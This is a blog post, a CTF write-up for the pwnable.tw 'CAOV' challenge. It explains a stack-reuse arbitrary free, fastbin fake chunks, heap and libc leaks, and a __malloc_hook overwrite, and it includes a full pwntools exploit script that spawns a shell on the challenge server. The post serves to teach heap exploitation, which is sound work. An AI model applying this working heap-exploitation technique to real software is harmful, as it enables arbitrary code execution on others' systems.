<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><title>Binary Exploitation [pwnable.tw] - CAOV - Tainted Bits</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Tainted Bits"><meta name="msapplication-TileImage" content="/images/logo-header.png"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Tainted Bits"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="Challange Description        Name CAOV   Points 350   Solves 134 times   Libc 2.23   Category Exploitation   Description What does “CAOV” stands for?"><meta property="og:type" content="article"><meta property="og:title" content="Binary Exploitation [pwnable.tw] - CAOV"><meta property="og:url" content="https://www.taintedbits.com/2020/07/12/binary-exploitation-pwnable-tw-caov/"><meta property="og:site_name" content="Tainted Bits"><meta property="og:description" content="Challange Description        Name CAOV   Points 350   Solves 134 times   Libc 2.23   Category Exploitation   Description What does “CAOV” stands for?"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://www.taintedbits.com/2020/07/12/binary-exploitation-pwnable-tw-caov/checksec.png"><meta property="og:image" content="https://www.taintedbits.com/2020/07/12/binary-exploitation-pwnable-tw-caov/vul-code-1.png"><meta property="og:image" content="https://www.taintedbits.com/2020/07/12/binary-exploitation-pwnable-tw-caov/flag.png"><meta property="article:published_time" content="2020-07-11T18:30:00.000Z"><meta property="article:modified_time" content="2021-06-07T07:03:12.535Z"><meta property="article:author" content="D3xt3r"><meta property="article:tag" content="Linux"><meta property="article:tag" content="CTF"><meta property="article:tag" content="pwnable"><meta property="article:tag" content="pwnable-tw"><meta property="article:tag" content="WarGames"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="checksec.png"><meta property="twitter:creator" content="@0xd3xt3r"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.taintedbits.com/2020/07/12/binary-exploitation-pwnable-tw-caov/"},"headline":"Tainted Bits","image":["https://www.taintedbits.com/2020/07/12/binary-exploitation-pwnable-tw-caov/checksec.png","https://www.taintedbits.com/2020/07/12/binary-exploitation-pwnable-tw-caov/vul-code-1.png","https://www.taintedbits.com/2020/07/12/binary-exploitation-pwnable-tw-caov/flag.png"],"datePublished":"2020-07-11T18:30:00.000Z","dateModified":"2021-06-07T07:03:12.535Z","author":{"@type":"Person","name":"D3xt3r"},"description":"Challange Description        Name CAOV   Points 350   Solves 134 times   Libc 2.23   Category Exploitation   Description What does “CAOV” stands for?"}</script><link rel="alternate" href="/atom.xml" title="Tainted Bits" type="application/atom+xml"><link rel="icon" href="/images/logo-header.png"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/railscasts.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css"><script src="https://www.googletagmanager.com/gtag/js?id=UA-128181439-1" async></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","UA-128181439-1")</script><meta name="generator" content="Hexo 5.4.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/images/logo-header.png" alt="Tainted Bits" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/publications">Publication</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/0xd3xt3r"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time datetime="2020-07-11T18:30:00.000Z" title="7/12/2020, 12:00:00 AM">2020-07-12</time></span><span class="level-item">Updated&nbsp;<time datetime="2021-06-07T07:03:12.535Z" title="6/7/2021, 12:33:12 PM">2021-06-07</time></span><span class="level-item"><a class="link-muted" href="/categories/CTF-Writeups/">CTF Writeups</a></span><span class="level-item">12 minutes read (About 1749 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">Binary Exploitation [pwnable.tw] - CAOV</h1><div class="content"><h2 id="Challange-Description"><a href="#Challange-Description" class="headerlink" title="Challange Description"></a>Challange Description</h2><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>Name</td><td>CAOV</td></tr><tr><td>Points</td><td>350</td></tr><tr><td>Solves</td><td>134 times</td></tr><tr><td>Libc</td><td>2.23</td></tr><tr><td>Category</td><td>Exploitation</td></tr><tr><td>Description</td><td>What does “CAOV” stands for?</td></tr></tbody></table><span id="more"></span><h2 id="Binary-Protection"><a href="#Binary-Protection" class="headerlink" title="Binary Protection"></a>Binary Protection</h2><p>Let’s check the binary protection</p><p><img src="checksec.png" alt="Binary Protection"></p><p>Since the binary has FULL RELRO enabled it we won’t be able to overwrite GOT table entry and it has PIE disable so we can use the GOT table entry to leak Libc address and if there are global allocated memory it can be helful to crate fake chunks.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>The vulnerability can be exploited by doing stack-reuse attack. The vulnerable part of the code is not visible in source code for that you will have to look at the decompiled code, which is shown below.</p><p><img src="vul-code-1.png" alt="decompilation of edit function"></p><p>There are two class variables which are allocated on the stack with the size 48 bytes each. The default destructor on line 12 sets all the field of object <strong>old_data</strong> to null. The destructor at line 15 is overridden destructor, it free’s the <strong>key</strong> field of the object <strong>copy_class</strong> if it is not null. The <strong>copy_class</strong> object is read from the stack and that memory is not touched by any other piece of code before the calling the destructor, so if we can set the value of <strong>key</strong> field using stack-reuse and do arbitrary free.</p><p>To carry out the attack we can prime the stack with the <strong>set_name</strong> function which allows you to write data up to 150 bytes on the stack and when the <strong>edit function</strong> execute immediately after that, the <strong>key pointer</strong> field of the <strong>copy_class</strong> will pick the value from the stack.</p><p>With this attack, we are setting the <strong>key pointer</strong> of the <em>copy_class</em> with the fake chunk pointer which on free will be put into the fastbin’s freelist. The fake-chunk attack on fastbin will be used as write primitive this will be the basic primitive based on which other primitives will be constructed. The fake-chunk can be crafted in the <em>bss section</em> in the <em>name variable</em> and since the PIE is disabled the address of name variable is well-known in advanced.</p><h2 id="The-Read-Primitive"><a href="#The-Read-Primitive" class="headerlink" title="The Read Primitive"></a>The Read Primitive</h2><p>The <em>Data</em> class has the field <em>key</em> is a pointer and on executing the <em>show</em> method of the class prints any value pointed by it. If we manage to change the value of the key pointer of the Data object we can do arbitrary read. And with the <em>edit function</em>, we can also change the value of the <em>key</em> field we also get arbitrary write.</p><p>But the looming question is how do we change the value of the <em>key pointer</em>. In the start of the application <em>Data object</em> is created and the reference of this object is stored on global memory. Since this memory is allocated using new operator it will be allocated on the heap. So if we manage to leak heap address we can calculate the object address from the base and rewrite the key field.</p><p>So this brings us to the next step, leaking the heap address. One simple way could be to allocate a large memory chunk and free it and reallocate and read the fd/bk pointer but all the memory writes made sure that they are with null-byte termination so this won’t work. If you look at the code closely you can see that in the <em>edit function</em> object data is printed before and after the edit. If we again craft a fake chunk and put it in the fastbin list which already has the free chunk then on printing the content of the object heap pointer will also be printed and then we can calculate the heap base from that by subtracting the offset.</p><p>Once we have the heap base address it’s not difficult the calculate than data object address. Once we know the data object address we can do a free on it using the stack-reuse attack discussed initially and allocate it immediately in the <em>edit function</em> and writing any value will set the <em>key field</em>. You can choose any function from the GOT table since the binary is compiled with FULL-RELRO all the function are resolved at the load time.</p><p>This concludes our memory leaking efforts. We have managed to leak heap base address using that we leaked the libc address. Next step is how do we get code execution? For that, we will need a write primitive, in the next section will discuss this.</p><h2 id="Write-Primitive"><a href="#Write-Primitive" class="headerlink" title="Write Primitive"></a>Write Primitive</h2><p>Creating write primitive should not be that difficult Since we have already used the write primitive previously to create the read primitive. Since we didn’t have the Libc address, we didn’t know the address of the target for a overwrite. So we had to do Libc leak first using the read primitive. To do arbitrary write we first have to free operation using the stack-reuse on the <em>Data object</em> which is already allocated on heap memory attack and in the edit function following that we allocate a new key with the length same as the fake-chunk size. This will return memory chunk from heap memory which has <em>Data object</em> data and then we will overwrite its <em>key field</em> with the overwrite target address.</p><p>Whenever a chunk is put in fastbin or removed from it there are chunk corruption check is done if the chunk falls in fastbin range which is 0x20-0x80 if not crash the program. Keeping this in mind whatever target address we choose has to fulfil this criterion. There are two such targets which come to my mind which might fulfil the above criteria, malloc_hook and free_hook. We can search memory nearby any of these hooks for fake chunk size. After some wandering around these hooks, malloc_hook seems to be the winner.</p><p>The memory area near malloc_hook there are the whole bunch of addresses (for eg 0x7fffff898972, etc) and if we try to fit a chunk with these value as fake chunk size we won’t succeed. So one neat trick that we can use is to select an address such that its fake chunk size value has MSB of 0x7f and rest of values as 0. This can be done by changing the alignment of the fake chunk address. The address which satisfies this is at <strong>malloc_hook-0x23</strong>. I have used the exact attack <strong><a href="#">Post not found: binary-exploitation-pwnable-tw-level-secretgarden secret garden challenge</a></strong> as well.</p><p>Next thing you need to do is free the <strong>name array fake chunk</strong> with size 0x80. Now name array is in fastbin freelist and Since we can write data to it by edit name function we should write it with the address <strong>malloc_hook-0x23</strong>. By doing this we have managed to create two fake chunks in fastbin( size 0x80) freelist. The first and second fake chunk has size 0x80 and 0x7f respectively. Next, we will allocate two chunks and in the second allocation, we will get the overwrite.</p><p>For creating the Shellcode we can use one_gadget tool. There are a couple of gadgets which are list out of which the one at offset 0xef6c4 has worked for me.</p><h2 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">preload_libs = <span class="string">&#x27;./libc_64.so.6 ./libstdc++.so.6 ./libgcc_s.so.1 ./libm.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line">libc = ELF(preload_libs.split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">app_bins = ELF(<span class="string">&#x27;./caov&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.REMOTE:</span><br><span class="line">    io = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10306</span>, timeout=<span class="number">2</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">    io = process(</span><br><span class="line">        <span class="string">&#x27;./caov&#x27;</span>,</span><br><span class="line">        env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>: preload_libs&#125;,</span><br><span class="line">        <span class="comment"># aslr=False,</span></span><br><span class="line">        aslr=<span class="literal">True</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, proc</span>):</span></span><br><span class="line">        self.proc = proc</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">intro</span>(<span class="params">self, name, key, value</span>):</span></span><br><span class="line">        self.proc.readuntil(<span class="string">&#x27;name: &#x27;</span>)</span><br><span class="line">        self.proc.sendline(name)</span><br><span class="line">        self.proc.readuntil(<span class="string">&#x27;key: &#x27;</span>)</span><br><span class="line">        self.proc.sendline(key)</span><br><span class="line">        self.proc.readuntil(<span class="string">&#x27;value: &#x27;</span>)</span><br><span class="line">        self.proc.sendline(<span class="built_in">str</span>(value))</span><br><span class="line">        self.proc.readuntil(<span class="string">&#x27;choice: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.proc.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> self.proc.readuntil(<span class="string">&#x27;choice: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">self, name, new_key_len, key, value</span>):</span></span><br><span class="line">        self.proc.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">        self.proc.readuntil(<span class="string">&#x27;name: &#x27;</span>)</span><br><span class="line">        self.proc.sendline(name)</span><br><span class="line">        self.proc.readuntil(<span class="string">&#x27;length: &#x27;</span>)</span><br><span class="line">        self.proc.sendline(<span class="built_in">str</span>(new_key_len))</span><br><span class="line">        <span class="keyword">if</span> new_key_len &gt; <span class="number">1000</span>:</span><br><span class="line">            self.proc.readuntil(<span class="string">&#x27;key length&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> self.proc.readuntil(<span class="string">&#x27;choice: &#x27;</span>)</span><br><span class="line">        self.proc.readuntil(<span class="string">&#x27;Key: &#x27;</span>)</span><br><span class="line">        self.proc.sendline(key)</span><br><span class="line">        self.proc.readuntil(<span class="string">&#x27;Value: &#x27;</span>)</span><br><span class="line">        self.proc.sendline(<span class="built_in">str</span>(value))</span><br><span class="line">        <span class="keyword">return</span> self.proc.readuntil(<span class="string">&#x27;choice: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">edit_name</span>(<span class="params">self, name</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.edit(name, <span class="number">1020</span>, <span class="literal">None</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = App(io)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create chunk of size 40 which on free will put it in</span></span><br><span class="line"><span class="comment"># fastbin freelist which later help in leaking the heap address</span></span><br><span class="line">app.intro(<span class="string">&#x27;Captain America&#x27;</span>, <span class="string">&#x27;\x00&#x27;</span>*<span class="number">41</span>, <span class="number">0x1234</span>)</span><br><span class="line"></span><br><span class="line">NAME_ADDR = <span class="number">0x6032c0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">heap_base_leak</span>():</span></span><br><span class="line">    <span class="string">&#x27;leak heap base&#x27;</span></span><br><span class="line">    fake_chunk_payload = flat(&#123;</span><br><span class="line">        <span class="number">0</span>: p64(<span class="number">0</span>),</span><br><span class="line">        <span class="number">8</span>: p64(<span class="number">0x20</span>),</span><br><span class="line">        <span class="number">16</span>: <span class="string">b&#x27;DDDDDDDD&#x27;</span>,</span><br><span class="line">        <span class="number">0x20</span>: p64(<span class="number">0x20</span>),</span><br><span class="line">        <span class="number">0x28</span>: p64(<span class="number">0x20</span>),</span><br><span class="line">        <span class="number">96</span>: p64(NAME_ADDR + <span class="number">0x10</span>)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    app.edit(fake_chunk_payload, <span class="number">20</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">20</span>, <span class="number">123123</span>)</span><br><span class="line"></span><br><span class="line">    fake_chunk_payload_2 = &#123;</span><br><span class="line">        <span class="number">0</span>: p64(<span class="number">0</span>),</span><br><span class="line">        <span class="number">8</span>: p64(<span class="number">0x41</span>),</span><br><span class="line">        <span class="number">16</span>: p64(<span class="number">0</span>),</span><br><span class="line">        <span class="number">0x40</span>: p64(<span class="number">0x00</span>),</span><br><span class="line">        <span class="number">0x48</span>: p64(<span class="number">0x20</span>),</span><br><span class="line">        <span class="number">96</span>: p64(NAME_ADDR + <span class="number">0x10</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    res = app.edit_name(flat(fake_chunk_payload_2))</span><br><span class="line"></span><br><span class="line">    leak_addr = unpack(res[res.rfind(<span class="string">b&#x27;Key: &#x27;</span>)+<span class="number">5</span>:res.rfind(<span class="string">b&#x27;Value&#x27;</span>)-<span class="number">1</span>], <span class="string">&#x27;all&#x27;</span>)</span><br><span class="line">    heap_base_offset = <span class="number">0x11c90</span>  <span class="comment"># 0x615c90 - 0x604000</span></span><br><span class="line">    h_base_addr = leak_addr - heap_base_offset</span><br><span class="line">    log.info(<span class="string">&#x27;Heap leak : &#x27;</span> + <span class="built_in">hex</span>(leak_addr))</span><br><span class="line">    log.info(<span class="string">&#x27;Heap Base : &#x27;</span> + <span class="built_in">hex</span>(h_base_addr))</span><br><span class="line">    <span class="keyword">return</span> h_base_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">heap_base = heap_base_leak()</span><br><span class="line">G_D_offset = <span class="number">0x11ce0</span>  <span class="comment"># 0x615ce0 - 0x604000</span></span><br><span class="line">G_D_addr = heap_base + G_D_offset</span><br><span class="line">log.info(<span class="string">&#x27;G Data addr : &#x27;</span>+<span class="built_in">hex</span>(G_D_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># --------- Libc base Leak</span></span><br><span class="line"></span><br><span class="line">fake_chunk = flat(<span class="built_in">list</span>(<span class="built_in">map</span>(p64, [</span><br><span class="line">    <span class="number">0</span>, <span class="number">0x51</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x21</span>, G_D_addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">])))</span><br><span class="line"></span><br><span class="line">data = flat(<span class="built_in">list</span>(<span class="built_in">map</span>(p64, [app_bins.got[<span class="string">&#x27;strlen&#x27;</span>], <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>])))</span><br><span class="line">app.edit(fake_chunk, <span class="number">50</span>, data, <span class="number">0x1234</span>)</span><br><span class="line"></span><br><span class="line">libc_res = app.show()</span><br><span class="line">libc_offset = <span class="number">0x155554ff2b70</span> - <span class="number">0x155554f68000</span></span><br><span class="line"></span><br><span class="line">libc_strlen = unpack(libc_res[libc_res.find(<span class="string">b&#x27;Key: &#x27;</span>)+<span class="number">5</span>: libc_res.find(<span class="string">b&#x27;Value:&#x27;</span>)-<span class="number">1</span>], <span class="string">&#x27;all&#x27;</span>)</span><br><span class="line">libc_base = libc_strlen - libc_offset</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;Libc Base : &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># --------- Libc base leak end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --------- exec overwrite</span></span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span></span><br><span class="line"></span><br><span class="line">one_shot = libc_base + <span class="number">0xef6c4</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;malloc_hook addr : &#x27;</span> + <span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line">fake_chunk_payload = &#123;</span><br><span class="line">    <span class="number">0</span>: p64(<span class="number">0</span>),</span><br><span class="line">    <span class="number">8</span>: p64(<span class="number">0x71</span>),</span><br><span class="line">    <span class="number">16</span>: <span class="string">b&#x27;DDDDDDDD&#x27;</span>,</span><br><span class="line">    <span class="number">0x70</span>: p64(<span class="number">0x70</span>),</span><br><span class="line">    <span class="number">0x78</span>: p64(<span class="number">0x20</span>),</span><br><span class="line">    <span class="number">96</span>: p64(NAME_ADDR + <span class="number">0x10</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.edit_name(flat(fake_chunk_payload))</span><br><span class="line"></span><br><span class="line">fake_chunk_payload = &#123;</span><br><span class="line">    <span class="number">0</span>: p64(<span class="number">0</span>),</span><br><span class="line">    <span class="number">8</span>: p64(<span class="number">0x71</span>),</span><br><span class="line">    <span class="number">16</span>: p64(malloc_hook),</span><br><span class="line">    <span class="number">0x70</span>: p64(<span class="number">0x70</span>),</span><br><span class="line">    <span class="number">0x78</span>: p64(<span class="number">0x20</span>),</span><br><span class="line">    <span class="number">96</span>: p64(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line">app.edit(flat(fake_chunk_payload), <span class="number">0x60</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x10</span>, <span class="number">0x1234</span>)</span><br><span class="line"></span><br><span class="line">fake_chunk_payload = &#123;</span><br><span class="line">    <span class="number">0</span>: p64(<span class="number">0</span>),</span><br><span class="line">    <span class="number">8</span>: p64(<span class="number">0x51</span>),</span><br><span class="line">    <span class="number">16</span>: p64(<span class="number">0</span>),</span><br><span class="line">    <span class="number">0x50</span>: p64(<span class="number">0x70</span>),</span><br><span class="line">    <span class="number">0x58</span>: p64(<span class="number">0x20</span>),</span><br><span class="line">    <span class="number">96</span>: p64(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p8(<span class="number">0</span>)*<span class="number">3</span> + p64(one_shot)</span><br><span class="line">log.info(<span class="string">&#x27;executing shell&#x27;</span>)</span><br><span class="line">app.edit(flat(fake_chunk_payload), <span class="number">0x60</span>, data, <span class="number">0x1234</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># --------- end overwrite</span></span><br></pre></td></tr></table></figure><p><img src="flag.png" alt="Exploit output"></p></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/Linux/">Linux</a><a class="link-muted mr-2" rel="tag" href="/tags/CTF/">CTF</a><a class="link-muted mr-2" rel="tag" href="/tags/pwnable/">pwnable</a><a class="link-muted mr-2" rel="tag" href="/tags/pwnable-tw/">pwnable-tw</a><a class="link-muted mr-2" rel="tag" href="/tags/WarGames/">WarGames</a></div></article></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2020/07/18/binary-exploitation-pwnable-tw-tcache-tear/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">Binary Exploitation [pwnable.tw] - Tcache Tear</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2020/07/11/binary-exploitation-pwnable-tw-spirited-away/"><span class="level-item">Binary Exploitation [pwnable.tw] - Spirited Away</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><div id="disqus_thread"><noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div><script>var disqus_config=function(){this.page.url="https://www.taintedbits.com/2020/07/12/binary-exploitation-pwnable-tw-caov/",this.page.identifier="/2020/07/12/binary-exploitation-pwnable-tw-caov/"};!function(){var t=document,e=t.createElement("script");e.src="//taintedbits.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen order-1"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="level is-mobile" href="#Challange-Description"><span class="level-left"><span class="level-item">1</span><span class="level-item">Challange Description</span></span></a></li><li><a class="level is-mobile" href="#Binary-Protection"><span class="level-left"><span class="level-item">2</span><span class="level-item">Binary Protection</span></span></a></li><li><a class="level is-mobile" href="#Vulnerability"><span class="level-left"><span class="level-item">3</span><span class="level-item">Vulnerability</span></span></a></li><li><a class="level is-mobile" href="#The-Read-Primitive"><span class="level-left"><span class="level-item">4</span><span class="level-item">The Read Primitive</span></span></a></li><li><a class="level is-mobile" href="#Write-Primitive"><span class="level-left"><span class="level-item">5</span><span class="level-item">Write Primitive</span></span></a></li><li><a class="level is-mobile" href="#Exploit-Code"><span class="level-left"><span class="level-item">6</span><span class="level-item">Exploit Code</span></span></a></li></ul></div></div><style>#toc .menu-list>li>a.is-active+.menu-list{display:block}#toc .menu-list>li>a+.menu-list{display:none}</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time datetime="2021-02-14T18:30:00.000Z">2021-02-15</time></p><p class="title"><a href="/2021/02/15/arm-architecture-webinar/">ARM Architecture and Shellcode Webinars</a></p><p class="categories"><a href="/categories/Binary-Exploitation/">Binary Exploitation</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time datetime="2020-07-17T18:30:00.000Z">2020-07-18</time></p><p class="title"><a href="/2020/07/18/binary-exploitation-pwnable-tw-tcache-tear/">Binary Exploitation [pwnable.tw] - Tcache Tear</a></p><p class="categories"><a href="/categories/CTF-Writeups/">CTF Writeups</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time datetime="2020-07-11T18:30:00.000Z">2020-07-12</time></p><p class="title"><a href="/2020/07/12/binary-exploitation-pwnable-tw-caov/">Binary Exploitation [pwnable.tw] - CAOV</a></p><p class="categories"><a 